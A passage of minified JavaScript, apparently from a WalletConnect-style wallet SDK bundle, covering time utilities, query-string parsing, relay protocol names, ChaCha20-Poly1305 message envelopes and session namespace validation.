0,e.ONE_SECOND=1,e.FIVE_SECONDS=5,e.TEN_SECONDS=10,e.THIRTY_SECONDS=30,e.SIXTY_SECONDS=60,e.ONE_MINUTE=e.SIXTY_SECONDS,e.FIVE_MINUTES=5*e.ONE_MINUTE,e.TEN_MINUTES=10*e.ONE_MINUTE,e.THIRTY_MINUTES=30*e.ONE_MINUTE,e.SIXTY_MINUTES=60*e.ONE_MINUTE,e.ONE_HOUR=e.SIXTY_MINUTES,e.THREE_HOURS=3*e.ONE_HOUR,e.SIX_HOURS=6*e.ONE_HOUR,e.TWELVE_HOURS=12*e.ONE_HOUR,e.TWENTY_FOUR_HOURS=24*e.ONE_HOUR,e.ONE_DAY=e.TWENTY_FOUR_HOURS,e.THREE_DAYS=3*e.ONE_DAY,e.FIVE_DAYS=5*e.ONE_DAY,e.SEVEN_DAYS=7*e.ONE_DAY,e.THIRTY_DAYS=30*e.ONE_DAY,e.ONE_WEEK=e.SEVEN_DAYS,e.TWO_WEEKS=2*e.ONE_WEEK,e.THREE_WEEKS=3*e.ONE_WEEK,e.FOUR_WEEKS=4*e.ONE_WEEK,e.ONE_YEAR=365*e.ONE_DAY}(Sw)),Sw}function H9(){return OE||(OE=1,function(e){Object.defineProperty(e,"__esModule",{value:!0});const t=ca;t.__exportStar(uq(),e),t.__exportStar(fq(),e)}(xw)),xw}function hq(){if(PE)return ml;PE=1,Object.defineProperty(ml,"__esModule",{value:!0}),ml.fromMiliseconds=ml.toMiliseconds=void 0;const e=H9();return ml.toMiliseconds=function(t){return t*e.ONE_THOUSAND},ml.fromMiliseconds=function(t){return Math.floor(t/e.ONE_THOUSAND)},ml}function dq(){return ME||(ME=1,function(e){Object.defineProperty(e,"__esModule",{value:!0});const t=ca;t.__exportStar(lq(),e),t.__exportStar(hq(),e)}(Ew)),Ew}var kE,ju={};function pq(){if(kE)return ju;kE=1,Object.defineProperty(ju,"__esModule",{value:!0}),ju.Watch=void 0;class e{constructor(){this.timestamps=new Map}start(e){if(this.timestamps.has(e))throw new Error(`Watch already started for label: ${e}`);this.timestamps.set(e,{started:Date.now()})}stop(e){const t=this.get(e);if(typeof t.elapsed<"u")throw new Error(`Watch already stopped for label: ${e}`);const r=Date.now()-t.started;this.timestamps.set(e,{started:t.started,elapsed:r})}get(e){const t=this.timestamps.get(e);if(typeof t>"u")throw new Error(`No timestamp found for label: ${e}`);return t}elapsed(e){const t=this.get(e);return t.elapsed||Date.now()-t.started}}return ju.Watch=e,ju.default=e,ju}var DE,$E,Cw={},Yh={};function gq(){if(DE)return Yh;DE=1,Object.defineProperty(Yh,"__esModule",{value:!0}),Yh.IWatch=void 0;return Yh.IWatch=class{},Yh}function vq(){return $E||($E=1,function(e){Object.defineProperty(e,"__esModule",{value:!0}),ca.__exportStar(gq(),e)}(Cw)),Cw}!function(e){Object.defineProperty(e,"__esModule",{value:!0});const t=ca;t.__exportStar(dq(),e),t.__exportStar(pq(),e),t.__exportStar(vq(),e),t.__exportStar(H9(),e)}(rt);var Or={};function ou(e){let t;return typeof window<"u"&&typeof window[e]<"u"&&(t=window[e]),t}function ah(e){const t=ou(e);if(!t)throw new Error(`${e} is not defined in Window`);return t}function mq(){return ah("document")}function bq(){return ou("document")}Object.defineProperty(Or,"__esModule",{value:!0}),Or.getLocalStorage=Or.getLocalStorageOrThrow=Or.getCrypto=Or.getCryptoOrThrow=V9=Or.getLocation=Or.getLocationOrThrow=V3=Or.getNavigator=Or.getNavigatorOrThrow=q9=Or.getDocument=Or.getDocumentOrThrow=Or.getFromWindowOrThrow=Or.getFromWindow=void 0,Or.getFromWindow=ou,Or.getFromWindowOrThrow=ah,Or.getDocumentOrThrow=mq;var q9=Or.getDocument=bq;function wq(){return ah("navigator")}function yq(){return ou("navigator")}Or.getNavigatorOrThrow=wq;var V3=Or.getNavigator=yq;function _q(){return ah("location")}function Eq(){return ou("location")}Or.getLocationOrThrow=_q;var V9=Or.getLocation=Eq;function xq(){return ah("crypto")}function Sq(){return ou("crypto")}function Cq(){return ah("localStorage")}function Aq(){return ou("localStorage")}Or.getCryptoOrThrow=xq,Or.getCrypto=Sq,Or.getLocalStorageOrThrow=Cq,Or.getLocalStorage=Aq;var G3={};Object.defineProperty(G3,"__esModule",{value:!0});var G9=G3.getWindowMetadata=void 0;const LE=Or;function Iq(){let e,t;try{e=LE.getDocumentOrThrow(),t=LE.getLocationOrThrow()}catch{return null}function r(...t){const r=e.getElementsByTagName("meta");for(let e=0;e<r.length;e++){const n=r[e],i=["itemprop","property","name"].map((e=>n.getAttribute(e))).filter((e=>!!e&&t.includes(e)));if(i.length&&i){const e=n.getAttribute("content");if(e)return e}}return""}const n=function(){let t=r("name","og:site_name","og:title","twitter:title");return t||(t=e.title),t}(),i=r("description","og:description","twitter:description","keywords"),o=t.origin,s=function(){const r=e.getElementsByTagName("link"),n=[];for(let e=0;e<r.length;e++){const i=r[e],o=i.getAttribute("rel");if(o&&o.toLowerCase().indexOf("icon")>-1){const e=i.getAttribute("href");if(e)if(-1===e.toLowerCase().indexOf("https:")&&-1===e.toLowerCase().indexOf("http:")&&0!==e.indexOf("//")){let r=t.protocol+"//"+t.host;if(0===e.indexOf("/"))r+=e;else{const n=t.pathname.split("/");n.pop();r+=n.join("/")+"/"+e}n.push(r)}else if(0===e.indexOf("//")){const r=t.protocol+e;n.push(r)}else n.push(e)}}return n}();return{description:i,url:o,icons:s,name:n}}G9=G3.getWindowMetadata=Iq;var c0={},Rq=e=>encodeURIComponent(e).replace(/[!'()*]/g,(e=>`%${e.charCodeAt(0).toString(16).toUpperCase()}`)),K9="%[a-f0-9]{2}",BE=new RegExp("("+K9+")|([^%]+?)","gi"),FE=new RegExp("("+K9+")+","gi");function E2(e,t){try{return[decodeURIComponent(e.join(""))]}catch{}if(1===e.length)return e;t=t||1;var r=e.slice(0,t),n=e.slice(t);return Array.prototype.concat.call([],E2(r),E2(n))}function Tq(e){try{return decodeURIComponent(e)}catch{for(var t=e.match(BE)||[],r=1;r<t.length;r++)t=(e=E2(t,r).join("")).match(BE)||[];return e}}function Nq(e){for(var t={"%FE%FF":"��","%FF%FE":"��"},r=FE.exec(e);r;){try{t[r[0]]=decodeURIComponent(r[0])}catch{var n=Tq(r[0]);n!==r[0]&&(t[r[0]]=n)}r=FE.exec(e)}t["%C2"]="�";for(var i=Object.keys(t),o=0;o<i.length;o++){var s=i[o];e=e.replace(new RegExp(s,"g"),t[s])}return e}var Oq=function(e){if("string"!=typeof e)throw new TypeError("Expected `encodedURI` to be of type `string`, got `"+typeof e+"`");try{return e=e.replace(/\+/g," "),decodeURIComponent(e)}catch{return Nq(e)}},Pq=(e,t)=>{if("string"!=typeof e||"string"!=typeof t)throw new TypeError("Expected the arguments to be of type `string`");if(""===t)return[e];const r=e.indexOf(t);return-1===r?[e]:[e.slice(0,r),e.slice(r+t.length)]},Mq=function(e,t){for(var r={},n=Object.keys(e),i=Array.isArray(t),o=0;o<n.length;o++){var s=n[o],a=e[s];(i?-1!==t.indexOf(s):t(s,a,e))&&(r[s]=a)}return r};!function(e){const t=Rq,r=Oq,n=Pq,i=Mq,o=Symbol("encodeFragmentIdentifier");function s(e){if("string"!=typeof e||1!==e.length)throw new TypeError("arrayFormatSeparator must be single character string")}function a(e,r){return r.encode?r.strict?t(e):encodeURIComponent(e):e}function c(e,t){return t.decode?r(e):e}function l(e){return Array.isArray(e)?e.sort():"object"==typeof e?l(Object.keys(e)).sort(((e,t)=>Number(e)-Number(t))).map((t=>e[t])):e}function u(e){const t=e.indexOf("#");return-1!==t&&(e=e.slice(0,t)),e}function h(e){const t=(e=u(e)).indexOf("?");return-1===t?"":e.slice(t+1)}function d(e,t){return t.parseNumbers&&!Number.isNaN(Number(e))&&"string"==typeof e&&""!==e.trim()?e=Number(e):t.parseBooleans&&null!==e&&("true"===e.toLowerCase()||"false"===e.toLowerCase())&&(e="true"===e.toLowerCase()),e}function f(e,t){s((t=Object.assign({decode:!0,sort:!0,arrayFormat:"none",arrayFormatSeparator:",",parseNumbers:!1,parseBooleans:!1},t)).arrayFormatSeparator);const r=function(e){let t;switch(e.arrayFormat){case"index":return(e,r,n)=>{t=/\[(\d*)\]$/.exec(e),e=e.replace(/\[\d*\]$/,""),t?(void 0===n[e]&&(n[e]={}),n[e][t[1]]=r):n[e]=r};case"bracket":return(e,r,n)=>{t=/(\[\])$/.exec(e),e=e.replace(/\[\]$/,""),t?void 0!==n[e]?n[e]=[].concat(n[e],r):n[e]=[r]:n[e]=r};case"colon-list-separator":return(e,r,n)=>{t=/(:list)$/.exec(e),e=e.replace(/:list$/,""),t?void 0!==n[e]?n[e]=[].concat(n[e],r):n[e]=[r]:n[e]=r};case"comma":case"separator":return(t,r,n)=>{const i="string"==typeof r&&r.includes(e.arrayFormatSeparator),o="string"==typeof r&&!i&&c(r,e).includes(e.arrayFormatSeparator);r=o?c(r,e):r;const s=i||o?r.split(e.arrayFormatSeparator).map((t=>c(t,e))):null===r?r:c(r,e);n[t]=s};case"bracket-separator":return(t,r,n)=>{const i=/(\[\])$/.test(t);if(t=t.replace(/\[\]$/,""),!i)return void(n[t]=r&&c(r,e));const o=null===r?[]:r.split(e.arrayFormatSeparator).map((t=>c(t,e)));void 0!==n[t]?n[t]=[].concat(n[t],o):n[t]=o};default:return(e,t,r)=>{void 0!==r[e]?r[e]=[].concat(r[e],t):r[e]=t}}}(t),i=Object.create(null);if("string"!=typeof e||!(e=e.trim().replace(/^[?#&]/,"")))return i;for(const o of e.split("&")){if(""===o)continue;let[e,s]=n(t.decode?o.replace(/\+/g," "):o,"=");s=void 0===s?null:["comma","separator","bracket-separator"].includes(t.arrayFormat)?s:c(s,t),r(c(e,t),s,i)}for(const e of Object.keys(i)){const r=i[e];if("object"==typeof r&&null!==r)for(const e of Object.keys(r))r[e]=d(r[e],t);else i[e]=d(r,t)}return!1===t.sort?i:(!0===t.sort?Object.keys(i).sort():Object.keys(i).sort(t.sort)).reduce(((e,t)=>{const r=i[t];return r&&"object"==typeof r&&!Array.isArray(r)?e[t]=l(r):e[t]=r,e}),Object.create(null))}e.extract=h,e.parse=f,e.stringify=(e,t)=>{if(!e)return"";s((t=Object.assign({encode:!0,strict:!0,arrayFormat:"none",arrayFormatSeparator:","},t)).arrayFormatSeparator);const r=r=>t.skipNull&&(e=>null==e)(e[r])||t.skipEmptyString&&""===e[r],n=function(e){switch(e.arrayFormat){case"index":return t=>(r,n)=>{const i=r.length;return void 0===n||e.skipNull&&null===n||e.skipEmptyString&&""===n?r:null===n?[...r,[a(t,e),"[",i,"]"].join("")]:[...r,[a(t,e),"[",a(i,e),"]=",a(n,e)].join("")]};case"bracket":return t=>(r,n)=>void 0===n||e.skipNull&&null===n||e.skipEmptyString&&""===n?r:null===n?[...r,[a(t,e),"[]"].join("")]:[...r,[a(t,e),"[]=",a(n,e)].join("")];case"colon-list-separator":return t=>(r,n)=>void 0===n||e.skipNull&&null===n||e.skipEmptyString&&""===n?r:null===n?[...r,[a(t,e),":list="].join("")]:[...r,[a(t,e),":list=",a(n,e)].join("")];case"comma":case"separator":case"bracket-separator":{const t="bracket-separator"===e.arrayFormat?"[]=":"=";return r=>(n,i)=>void 0===i||e.skipNull&&null===i||e.skipEmptyString&&""===i?n:(i=null===i?"":i,0===n.length?[[a(r,e),t,a(i,e)].join("")]:[[n,a(i,e)].join(e.arrayFormatSeparator)])}default:return t=>(r,n)=>void 0===n||e.skipNull&&null===n||e.skipEmptyString&&""===n?r:null===n?[...r,a(t,e)]:[...r,[a(t,e),"=",a(n,e)].join("")]}}(t),i={};for(const t of Object.keys(e))r(t)||(i[t]=e[t]);const o=Object.keys(i);return!1!==t.sort&&o.sort(t.sort),o.map((r=>{const i=e[r];return void 0===i?"":null===i?a(r,t):Array.isArray(i)?0===i.length&&"bracket-separator"===t.arrayFormat?a(r,t)+"[]":i.reduce(n(r),[]).join("&"):a(r,t)+"="+a(i,t)})).filter((e=>e.length>0)).join("&")},e.parseUrl=(e,t)=>{t=Object.assign({decode:!0},t);const[r,i]=n(e,"#");return Object.assign({url:r.split("?")[0]||"",query:f(h(e),t)},t&&t.parseFragmentIdentifier&&i?{fragmentIdentifier:c(i,t)}:{})},e.stringifyUrl=(t,r)=>{r=Object.assign({encode:!0,strict:!0,[o]:!0},r);const n=u(t.url).split("?")[0]||"",i=e.extract(t.url),s=e.parse(i,{sort:!1}),c=Object.assign(s,t.query);let l=e.stringify(c,r);l&&(l=`?${l}`);let h=function(e){let t="";const r=e.indexOf("#");return-1!==r&&(t=e.slice(r)),t}(t.url);return t.fragmentIdentifier&&(h=`#${r[o]?a(t.fragmentIdentifier,r):t.fragmentIdentifier}`),`${n}${l}${h}`},e.pick=(t,r,n)=>{n=Object.assign({parseFragmentIdentifier:!0,[o]:!1},n);const{url:s,query:a,fragmentIdentifier:c}=e.parseUrl(t,n);return e.stringifyUrl({url:s,query:i(a,r),fragmentIdentifier:c},n)},e.exclude=(t,r,n)=>{const i=Array.isArray(r)?e=>!r.includes(e):(e,t)=>!r(e,t);return e.pick(t,i,n)}}(c0);const kq={waku:{publish:"waku_publish",batchPublish:"waku_batchPublish",subscribe:"waku_subscribe",batchSubscribe:"waku_batchSubscribe",subscription:"waku_subscription",unsubscribe:"waku_unsubscribe",batchUnsubscribe:"waku_batchUnsubscribe"},irn:{publish:"irn_publish",batchPublish:"irn_batchPublish",subscribe:"irn_subscribe",batchSubscribe:"irn_batchSubscribe",subscription:"irn_subscription",unsubscribe:"irn_unsubscribe",batchUnsubscribe:"irn_batchUnsubscribe"},iridium:{publish:"iridium_publish",batchPublish:"iridium_batchPublish",subscribe:"iridium_subscribe",batchSubscribe:"iridium_batchSubscribe",subscription:"iridium_subscription",unsubscribe:"iridium_unsubscribe",batchUnsubscribe:"iridium_batchUnsubscribe"}},Dq=":";function $q(e){const[t,r]=e.split(Dq);return{namespace:t,reference:r}}function Lq(e,t=[]){const r=[];return Object.keys(e).forEach((n=>{if(t.length&&!t.includes(n))return;const i=e[n];r.push(...i.accounts)})),r}function J9(e,t){return e.includes(":")?[e]:t.chains||[]}const Z9="base10",_i="base16",x2="base64pad",K3="utf8",Q9=0,au=1,Bq=0,jE=1,S2=12,J3=32;function Fq(){const e=H3.generateKeyPair();return{privateKey:xi(e.secretKey,_i),publicKey:xi(e.publicKey,_i)}}function C2(){return xi(oh.randomBytes(J3),_i)}function jq(e,t){const r=H3.sharedKey(Ui(e,_i),Ui(t,_i),!0);return xi(new Cz(Pv.SHA256,r).expand(J3),_i)}function Uq(e){return xi(Pv.hash(Ui(e,_i)),_i)}function af(e){return xi(Pv.hash(Ui(e,K3)),_i)}function Wq(e){return Ui(`${e}`,Z9)}function P0(e){return Number(xi(e,Z9))}function zq(e){const t=Wq(typeof e.type<"u"?e.type:Q9);if(P0(t)===au&&typeof e.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const r=typeof e.senderPublicKey<"u"?Ui(e.senderPublicKey,_i):void 0,n=typeof e.iv<"u"?Ui(e.iv,_i):oh.randomBytes(S2);return qq({type:t,sealed:new W3.ChaCha20Poly1305(Ui(e.symKey,_i)).seal(n,Ui(e.message,K3)),iv:n,senderPublicKey:r})}function Hq(e){const t=new W3.ChaCha20Poly1305(Ui(e.symKey,_i)),{sealed:r,iv:n}=$g(e.encoded),i=t.open(n,r);if(null===i)throw new Error("Failed to decrypt");return xi(i,K3)}function qq(e){if(P0(e.type)===au){if(typeof e.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return xi(b2([e.type,e.senderPublicKey,e.iv,e.sealed]),x2)}return xi(b2([e.type,e.iv,e.sealed]),x2)}function $g(e){const t=Ui(e,x2),r=t.slice(Bq,jE),n=jE;if(P0(r)===au){const e=n+J3,i=e+S2,o=t.slice(n,e),s=t.slice(e,i);return{type:r,sealed:t.slice(i),iv:s,senderPublicKey:o}}const i=n+S2,o=t.slice(n,i);return{type:r,sealed:t.slice(i),iv:o}}function Vq(e,t){const r=$g(e);return Y9({type:P0(r.type),senderPublicKey:typeof r.senderPublicKey<"u"?xi(r.senderPublicKey,_i):void 0,receiverPublicKey:null==t?void 0:t.receiverPublicKey})}function Y9(e){const t=(null==e?void 0:e.type)||Q9;if(t===au){if(typeof(null==e?void 0:e.senderPublicKey)>"u")throw new Error("missing sender public key");if(typeof(null==e?void 0:e.receiverPublicKey)>"u")throw new Error("missing receiver public key")}return{type:t,senderPublicKey:null==e?void 0:e.senderPublicKey,receiverPublicKey:null==e?void 0:e.receiverPublicKey}}function UE(e){return e.type===au&&"string"==typeof e.senderPublicKey&&"string"==typeof e.receiverPublicKey}var Gq=Object.defineProperty,WE=Object.getOwnPropertySymbols,Kq=Object.prototype.hasOwnProperty,Jq=Object.prototype.propertyIsEnumerable,zE=(e,t,r)=>t in e?Gq(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,HE=(e,t)=>{for(var r in t||(t={}))Kq.call(t,r)&&zE(e,r,t[r]);if(WE)for(var r of WE(t))Jq.call(t,r)&&zE(e,r,t[r]);return e};const Zq="ReactNative",os={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},Qq="js";function Z3(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function M0(){return!q9()&&!!V3()&&navigator.product===Zq}function k0(){return!Z3()&&!!V3()}function D0(){return M0()?os.reactNative:Z3()?os.node:k0()?os.browser:os.unknown}function Yq(e,t){let r=c0.parse(e);return r=HE(HE({},r),t),e=c0.stringify(r)}function Xq(){return G9()||{name:"",description:"",url:"",icons:[""]}}function eV(){if(D0()===os.reactNative&&typeof global<"u"&&typeof(null==global?void 0:global.Platform)<"u"){const{OS:e,Version:t}=global.Platform;return[e,t].join("-")}const e=FH();if(null===e)return"unknown";const t=e.os?e.os.replace(" ","").toLowerCase():"unknown";return"browser"===e.type?[t,e.name,e.version].join("-"):[t,e.version].join("-")}function tV(){var e;const t=D0();return t===os.browser?[t,(null==(e=V9())?void 0:e.host)||"unknown"].join(":"):t}function rV(e,t,r){const n=eV(),i=tV();return[[e,t].join("-"),[Qq,r].join("-"),n,i].join("/")}function nV({protocol:e,version:t,relayUrl:r,sdkVersion:n,auth:i,projectId:o,useOnCloseEvent:s}){const a=r.split("?"),c={auth:i,ua:rV(e,t,n),projectId:o,useOnCloseEvent:s||void 0},l=Yq(a[1]||"",c);return a[0]+"?"+l}function Ol(e,t){return e.filter((e=>t.includes(e))).length===e.length}function X9(e){return Object.fromEntries(e.entries())}function eI(e){return new Map(Object.entries(e))}function Qu(e=rt.FIVE_MINUTES,t){const r=rt.toMiliseconds(e||rt.FIVE_MINUTES);let n,i,o;return{resolve:e=>{o&&n&&(clearTimeout(o),n(e))},reject:e=>{o&&i&&(clearTimeout(o),i(e))},done:()=>new Promise(((e,s)=>{o=setTimeout((()=>{s(new Error(t))}),r),n=e,i=s}))}}function l0(e,t,r){return new Promise((async(n,i)=>{const o=setTimeout((()=>i(new Error(r))),t);try{n(await e)}catch(e){i(e)}clearTimeout(o)}))}function tI(e,t){if("string"==typeof t&&t.startsWith(`${e}:`))return t;if("topic"===e.toLowerCase()){if("string"!=typeof t)throw new Error('Value must be "string" for expirer target type: topic');return`topic:${t}`}if("id"===e.toLowerCase()){if("number"!=typeof t)throw new Error('Value must be "number" for expirer target type: id');return`id:${t}`}throw new Error(`Unknown expirer target type: ${e}`)}function iV(e){return tI("topic",e)}function sV(e){return tI("id",e)}function rI(e){const[t,r]=e.split(":"),n={id:void 0,topic:void 0};if("topic"===t&&"string"==typeof r)n.topic=r;else{if("id"!==t||!Number.isInteger(Number(r)))throw new Error(`Invalid target, expected id:number or topic:string, got ${t}:${r}`);n.id=Number(r)}return n}function uo(e,t){return rt.fromMiliseconds((t||Date.now())+rt.toMiliseconds(e))}function vc(e){return Date.now()>=rt.toMiliseconds(e)}function fn(e,t){return`${e}${t?`:${t}`:""}`}function Aw(e=[],t=[]){return[...new Set([...e,...t])]}async function oV({id:e,topic:t,wcDeepLink:r}){try{if(!r)return;const n="string"==typeof r?JSON.parse(r):r;let i=null==n?void 0:n.href;if("string"!=typeof i)return;i.endsWith("/")&&(i=i.slice(0,-1));const o=`${i}/wc?requestId=${e}&sessionTopic=${t}`,s=D0();s===os.browser?o.startsWith("https://")?window.open(o,"_blank","noreferrer noopener"):window.open(o,"_self","noreferrer noopener"):s===os.reactNative&&typeof(null==global?void 0:global.Linking)<"u"&&await global.Linking.openURL(o)}catch(e){console.error(e)}}const aV="irn";function A2(e){return(null==e?void 0:e.relay)||{protocol:aV}}function K1(e){const t=kq[e];if(typeof t>"u")throw new Error(`Relay Protocol not supported: ${e}`);return t}var cV=Object.defineProperty,qE=Object.getOwnPropertySymbols,lV=Object.prototype.hasOwnProperty,uV=Object.prototype.propertyIsEnumerable,VE=(e,t,r)=>t in e?cV(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,fV=(e,t)=>{for(var r in t||(t={}))lV.call(t,r)&&VE(e,r,t[r]);if(qE)for(var r of qE(t))uV.call(t,r)&&VE(e,r,t[r]);return e};function hV(e,t="-"){const r={},n="relay"+t;return Object.keys(e).forEach((t=>{if(t.startsWith(n)){const i=t.replace(n,""),o=e[t];r[i]=o}})),r}function dV(e){const t=e.indexOf(":"),r=-1!==e.indexOf("?")?e.indexOf("?"):void 0,n=e.substring(0,t),i=e.substring(t+1,r).split("@"),o=typeof r<"u"?e.substring(r):"",s=c0.parse(o);return{protocol:n,topic:pV(i[0]),version:parseInt(i[1],10),symKey:s.symKey,relay:hV(s)}}function pV(e){return e.startsWith("//")?e.substring(2):e}function gV(e,t="-"){const r={};return Object.keys(e).forEach((n=>{const i="relay"+t+n;e[n]&&(r[i]=e[n])})),r}function vV(e){return`${e.protocol}:${e.topic}@${e.version}?`+c0.stringify(fV({symKey:e.symKey},gV(e.relay)))}function ch(e){const t=[];return e.forEach((e=>{const[r,n]=e.split(":");t.push(`${r}:${n}`)})),t}function mV(e){const t=[];return Object.values(e).forEach((e=>{t.push(...ch(e.accounts))})),t}function bV(e,t){const r=[];return Object.values(e).forEach((e=>{ch(e.accounts).includes(t)&&r.push(...e.methods)})),r}function wV(e,t){const r=[];return Object.values(e).forEach((e=>{ch(e.accounts).includes(t)&&r.push(...e.events)})),r}function yV(e,t){const r=J1(e,t);if(r)throw new Error(r.message);const n={};for(const[t,r]of Object.entries(e))n[t]={methods:r.methods,events:r.events,chains:r.accounts.map((e=>`${e.split(":")[0]}:${e.split(":")[1]}`))};return n}function Q3(e){return e.includes(":")}function yd(e){return Q3(e)?e.split(":")[0]:e}const _V={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},EV={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function je(e,t){const{message:r,code:n}=EV[e];return{message:t?`${r} ${t}`:r,code:n}}function nn(e,t){const{message:r,code:n}=_V[e];return{message:t?`${r} ${t}`:r,code:n}}function ta(e,t){return!!Array.isArray(e)&&(!(typeof t<"u"&&e.length)||e.every(t))}function cf(e){return Object.getPrototypeOf(e)===Object.prototype&&Object.keys(e).length}function wi(e){return typeof e>"u"}function Nn(e,t){return!(!t||!wi(e))||"string"==typeof e&&!!e.trim().length}function Y3(e,t){return!(!t||!wi(e))||"number"==typeof e&&!isNaN(e)}function xV(e,t){const{requiredNamespaces:r}=t,n=Object.keys(e.namespaces),i=Object.keys(r);let o=!0;return!!Ol(i,n)&&(n.forEach((t=>{const{accounts:n,methods:i,events:s}=e.namespaces[t],a=ch(n),c=r[t];Ol(J9(t,c),a)&&Ol(c.methods,i)&&Ol(c.events,s)||(o=!1)})),o)}function Lg(e){return!(!Nn(e,!1)||!e.includes(":"))&&2===e.split(":").length}function SV(e){if(Nn(e,!1)&&e.includes(":")){const t=e.split(":");if(3===t.length){const e=t[0]+":"+t[1];return!!t[2]&&Lg(e)}}return!1}function CV(e){if(Nn(e,!1))try{return typeof new URL(e)<"u"}catch{return!1}return!1}function AV(e){var t;return null==(t=null==e?void 0:e.proposer)?void 0:t.publicKey}function IV(e){return null==e?void 0:e.topic}function RV(e,t){let r=null;return Nn(null==e?void 0:e.publicKey,!1)||(r=je("MISSING_OR_INVALID",`${t} controller public key should be a string`)),r}function GE(e){let t=!0;return ta(e)?e.length&&(t=e.every((e=>Nn(e,!1)))):t=!1,t}function TV(e,t,r){let n=null;return ta(t)&&t.length?t.forEach((e=>{n||Lg(e)||(n=nn("UNSUPPORTED_CHAINS",`${r}, chain ${e} should be a string and conform to "namespace:chainId" format`))})):Lg(e)||(n=nn("UNSUPPORTED_CHAINS",`${r}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),n}function NV(e,t,r){let n=null;return Object.entries(e).forEach((([e,i])=>{if(n)return;const o=TV(e,J9(e,i),`${t} ${r}`);o&&(n=o)})),n}function OV(e,t){let r=null;return ta(e)?e.forEach((e=>{r||SV(e)||(r=nn("UNSUPPORTED_ACCOUNTS",`${t}, account ${e} should be a string and conform to "namespace:chainId:address" format`))})):r=nn("UNSUPPORTED_ACCOUNTS",`${t}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),r}function PV(e,t){let r=null;return Object.values(e).forEach((e=>{if(r)return;const n=OV(null==e?void 0:e.accounts,`${t} namespace`);n&&(r=n)})),r}function MV(e,t){let r=null;return GE(null==e?void 0:e.methods)?GE(null==e?void 0:e.events)||(r=nn("UNSUPPORTED_EVENTS",`${t}, events should be an array of strings or empty array for no events`)):r=nn("UNSUPPORTED_METHODS",`${t}, methods should be an array of strings or empty array for no methods`),r}function nI(e,t){let r=null;return Object.values(e).forEach((e=>{if(r)return;const n=MV(e,`${t}, namespace`);n&&(r=n)})),r}function kV(e,t,r){let n=null;if(e&&cf(e)){const i=nI(e,t);i&&(n=i);const o=NV(e,t,r);o&&(n=o)}else n=je("MISSING_OR_INVALID",`${t}, ${r} should be an object with data`);return n}function J1(e,t){let r=null;if(e&&cf(e)){const n=nI(e,t);n&&(r=n);const i=PV(e,t);i&&(r=i)}else r=je("MISSING_OR_INVALID",`${t}, namespaces should be an object with data`);return r}function iI(e){return Nn(e.protocol,!0)}function DV(e,t){let r=!1;return t&&!e?r=!0:e&&ta(e)&&e.length&&e.forEach((e=>{r=iI(e)})),r}function $V(e){return"number"==typeof e}function ji(e){return typeof e<"u"&&null!==typeof e}function LV(e){return!!(e&&"object"==typeof e&&e.code&&Y3(e.code,!1)&&e.message&&Nn(e.message,!1))}function BV(e){return!(wi(e)||!Nn(e.method,!1))}function FV(e){return!(wi(e)||wi(e.result)&&wi(e.error)||!Y3(e.id,!1)||!Nn(e.jsonrpc,!1))}function jV(e){return!(wi(e)||!Nn(e.name,!1))}function KE(e,t){return!(!Lg(t)||!mV(e).includes(t))}function UV(e,t,r){return!!Nn(r,!1)&&bV(e,t).includes(r)}function WV(e,t,r){return!!Nn(r,!1)&&wV(e,t).includes(r)}function JE(e,t,r){let n=null;const i=zV(e),o=HV(t),s=Object.keys(i),a=Object.keys(o),c=ZE(Object.keys(e)),l=ZE(Object.keys(t)),u=c.filter((e=>!l.includes(e)));return u.length&&(n=je("NON_CONFORMING_NAMESPACES",`${r} namespaces keys don't satisfy requiredNamespaces.\n      Required: ${u.toString()}\n      Received: ${Object.keys(t).toString()}`)),Ol(s,a)||(n=je("NON_CONFORMING_NAMESPACES",`${r} namespaces chains don't satisfy required namespaces.\n      Required: ${s.toString()}\n      Approved: ${a.toString()}`)),Object.keys(t).forEach((e=>{if(!e.includes(":")||n)return;const i=ch(t[e].accounts);i.includes(e)||(n=je("NON_CONFORMING_NAMESPACES",`${r} namespaces accounts don't satisfy namespace accounts for ${e}\n        Required: ${e}\n        Approved: 